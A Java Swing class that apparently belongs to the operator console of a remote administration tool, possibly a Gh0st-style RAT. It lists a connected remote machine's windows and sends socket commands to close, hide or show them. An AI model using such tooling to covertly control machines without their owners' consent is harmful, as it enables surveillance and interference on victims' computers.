package me.server.receive;

import com.sun.jna.platform.WindowUtils;
import me.server.Server;
import me.server.utils.ImageRendererUtils;
import me.server.utils.MessageFlags;
import me.server.utils.SendMessage;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;

public class EnumWindows {
    Socket socket;
    DefaultTableModel defaultTableModel;
    InputStream inputStream = EnumWindows.class.getClassLoader().getResourceAsStream("me/resources/ghost.png");
    Image image = ImageIO.read(inputStream);
    public EnumWindows(Socket socket,String IP) throws IOException {
        this.socket = socket;
        System.setProperty("sun.java2d.noddraw", "true");
        JDialog frame1 = new JDialog();
        WindowUtils.setWindowAlpha(frame1,0.8f);
        frame1.setIconImage(image);
        JPanel panel = new JPanel();
        JButton button = new JButton("刷新");
        JButton button1 = new JButton("关闭窗口");
        JButton button2 = new JButton("隐藏窗口");
        JButton button3 = new JButton("显示窗口");
        panel.add(button1);
        panel.add(button2);
        panel.add(button3);
        panel.add(button);
        frame1.add(panel, BorderLayout.NORTH);
        JTable table = new JTable(){
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };
        defaultTableModel = new DefaultTableModel(null,new String[]{"","PID","窗口名称"});
        table.setModel(defaultTableModel);
        table.setShowVerticalLines(false);
        table.setShowHorizontalLines(false);
        table.getTableHeader().setReorderingAllowed(false);
        table.getTableHeader().setResizingAllowed(false);
        table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
        table.getColumnModel().getColumn(0)
                .setCellRenderer(new ImageRendererUtils());
        table.getColumnModel().getColumn(0).setPreferredWidth(20);
        table.getColumnModel().getColumn(1).setPreferredWidth(100);
        table.getColumnModel().getColumn(2).setPreferredWidth(500);
        frame1.setTitle("\\\\" + IP + "-" +"窗口查看");
        JScrollPane scrollPane = new JScrollPane(table);
        frame1.add(scrollPane);
        frame1.setLocationRelativeTo(null);
        frame1.setSize(600,400);
        frame1.setVisible(true);
        button.addActionListener((a)->{
            flash(table);
        });
        button1.addActionListener((a)->{
            int i = table.getSelectedRow();
            String context = (String) table.getValueAt(i,2);
            SendMessage.Send(MessageFlags.CLOSE_WINDOW,context.getBytes(),socket);
            flash(table);
        });
        button2.addActionListener((a)->{
            int i = table.getSelectedRow();
            String context = (String) table.getValueAt(i,2);
            SendMessage.Send(MessageFlags.HIDE_WINDOW,context.getBytes(),socket);
        });
        button3.addActionListener((a)->{
            int i = table.getSelectedRow();
            String context = (String) table.getValueAt(i,2);
            SendMessage.Send(MessageFlags.SHOW_WINDOW,context.getBytes(),socket);
        });
    }
    public void flash(JTable table) {
        for(int index = table.getModel().getRowCount() - 1; index >= 0; index--) {
            defaultTableModel.removeRow(index);
        }
        SendMessage.SendHead(MessageFlags.ENUM_WINDOWS,socket);
    }
    public void update(byte[] bytes) throws IOException {
        String context = new String(bytes);
        String[] strs = context.split("\\|");
        Object[] objects = {image,strs[0],strs[1]};
        defaultTableModel.addRow(objects);
    }
}